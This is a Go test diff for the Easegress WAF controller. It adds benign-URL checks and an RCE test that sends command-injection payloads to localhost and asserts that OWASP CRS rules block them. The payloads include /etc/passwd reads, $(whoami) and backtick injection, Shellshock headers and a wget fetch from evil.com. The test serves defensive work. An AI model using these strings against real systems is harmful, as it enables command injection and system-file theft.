@@ -20,6 +20,7 @@ package wafcontroller
 import (
 	"fmt"
 	"net/http"
+	"strings"
 	"testing"
 
 	"github.com/megaease/easegress/v2/pkg/context"
@@ -605,6 +606,180 @@ func TestXssAttackRules(t *testing.T) {
 	for _, tc := range xssAttackTestCases {
 		fmt.Println("Testing case:", tc.Name)
 		req, err := http.NewRequest(tc.Method, "http://127.0.0.1:8080"+tc.URL, nil)
+		assert.Nil(err, "Failed to create request", tc)
+
+		for key, value := range tc.Headers {
+			req.Header.Set(key, value)
+		}
+
+		for name, value := range tc.Cookies {
+			req.AddCookie(&http.Cookie{Name: name, Value: value})
+		}
+		setRequest(t, ctx, tc.Name, req)
+		result := ruleGroup.Handle(ctx)
+		assert.NotNil(result.Interruption)
+		assert.Equal(http.StatusForbidden, result.Interruption.Status)
+		assert.Equal(protocol.ResultBlocked, result.Result)
+	}
+
+	allowedUrls := []string{
+		"/test?id=123",
+		"/test?id=hello",
+		"/test?id=alice&foo=bar",
+		"/test?id=2025-08-07",
+		"/test?user=alice&search=book",
+		"/test?category=electronics&page=2",
+		"/test?email=alice@example.com",
+		"/test?price=19.99",
+		"/test?name=张三",
+		"/test?comment=nice+post",
+	}
+	for _, u := range allowedUrls {
+		req, err := http.NewRequest(http.MethodGet, "http://127.0.0.1:8080"+u, nil)
+		assert.Nil(err)
+		setRequest(t, ctx, u, req)
+		result := ruleGroup.Handle(ctx)
+		assert.Equal(protocol.ResultOk, result.Result)
+	}
+}
+
+func TestRCEAttackRules(t *testing.T) {
+	// Test for remote code execution (RCE) attacks
+	assert := assert.New(t)
+
+	type rceAttackTestCase struct {
+		Name        string
+		Method      string
+		URL         string
+		Headers     map[string]string
+		Cookies     map[string]string
+		RuleID      string
+		Description string
+		Body        string
+	}
+
+	var rceAttackTestCases = []rceAttackTestCase{
+		{
+			Name:        "932230_basic_unix_command",
+			Method:      "GET",
+			URL:         "/vuln?cmd=ls",
+			RuleID:      "932230",
+			Description: "Basic Unix command injection: ls",
+		},
+		{
+			Name:        "932230_command_concat",
+			Method:      "GET",
+			URL:         "/vuln?cmd=cat /etc/passwd;id",
+			RuleID:      "932230",
+			Description: "Command concatenation with semicolon",
+		},
+		{
+			Name:        "932130_unix_shell_expression",
+			Method:      "GET",
+			URL:         "/vuln?cmd=$(whoami)",
+			RuleID:      "932130",
+			Description: "Shell expression injection: $(whoami)",
+		},
+		{
+			Name:        "932220_pipe_injection",
+			Method:      "GET",
+			URL:         "/vuln?cmd=cat /etc/passwd | grep root",
+			RuleID:      "932220",
+			Description: "Unix pipe injection",
+		},
+		{
+			Name:        "932280_brace_expansion",
+			Method:      "GET",
+			URL:         "/vuln?cmd=echo {1,2,3}",
+			RuleID:      "932280",
+			Description: "Brace expansion in Unix shell",
+		},
+		{
+			Name:        "932330_shell_history_invocation",
+			Method:      "GET",
+			URL:         "/vuln?cmd=!-1",
+			RuleID:      "932330",
+			Description: "Unix shell history invocation",
+		},
+		{
+			Name:        "932160_unix_shell_keyword",
+			Method:      "GET",
+			URL:         "/vuln?cmd=wget http://evil.com/a.sh",
+			RuleID:      "932160",
+			Description: "Unix shell code found (wget)",
+		},
+		{
+			Name:        "932120_powershell_command",
+			Method:      "GET",
+			URL:         "/vuln?cmd=powershell -Command \"Get-ChildItem\"",
+			RuleID:      "932120",
+			Description: "Windows PowerShell command injection",
+		},
+		{
+			Name:        "932140_windows_batch_for",
+			Method:      "GET",
+			URL:         "/vuln?cmd=for /f %i in ('dir') do @echo %i",
+			RuleID:      "932140",
+			Description: "Windows batch 'for' command injection",
+		},
+		{
+			Name:        "932170_shellshock_header",
+			Method:      "GET",
+			URL:         "/vuln",
+			Headers:     map[string]string{"User-Agent": "() { :; }; /bin/bash -c 'id'"},
+			RuleID:      "932170",
+			Description: "Shellshock attack via User-Agent header",
+		},
+		{
+			Name:        "932171_shellshock_arg",
+			Method:      "GET",
+			URL:         "/vuln?foo=() { :; }; echo shellshock",
+			RuleID:      "932171",
+			Description: "Shellshock via argument",
+		},
+		{
+			Name:        "932200_rce_bypass_tick",
+			Method:      "GET",
+			URL:         "/vuln?cmd=`whoami`",
+			RuleID:      "932200",
+			Description: "Evasion technique using backticks",
+		},
+		{
+			Name:        "932240_unix_injection_evasion",
+			Method:      "GET",
+			URL:         "/vuln?cmd=ls%20%24(awk%20'BEGIN{system(\"id\")}'%20)",
+			RuleID:      "932240",
+			Description: "Unix command injection evasion attempt",
+		},
+	}
+
+	customRules := protocol.CustomsSpec(crsSetupConf)
+
+	owaspRules := protocol.OwaspRulesSpec{
+		"REQUEST-901-INITIALIZATION.conf",
+		"REQUEST-932-APPLICATION-ATTACK-RCE.conf",
+		"REQUEST-949-BLOCKING-EVALUATION.conf",
+	}
+	spec := &protocol.RuleGroupSpec{
+		Name: "testGroup",
+		Rules: protocol.RuleSpec{
+			OwaspRules: &owaspRules,
+			Customs:    &customRules,
+		},
+	}
+	ruleGroup, err := newRuleGroup(spec)
+	assert.Nil(err, "Failed to create rule group")
+	ctx := context.New(nil)
+
+	for _, tc := range rceAttackTestCases {
+		fmt.Println("Testing case:", tc.Name)
+		var req *http.Request
+		var err error
+		if tc.Body == "" {
+			req, err = http.NewRequest(tc.Method, "http://127.0.0.1:8080"+tc.URL, nil)
+		} else {
+			req, err = http.NewRequest(tc.Method, "http://127.0.0.1:8080"+tc.URL, strings.NewReader(tc.Body))
+		}
 		assert.Nil(err, "Failed to create request", tc)
 
 		for key, value := range tc.Headers {
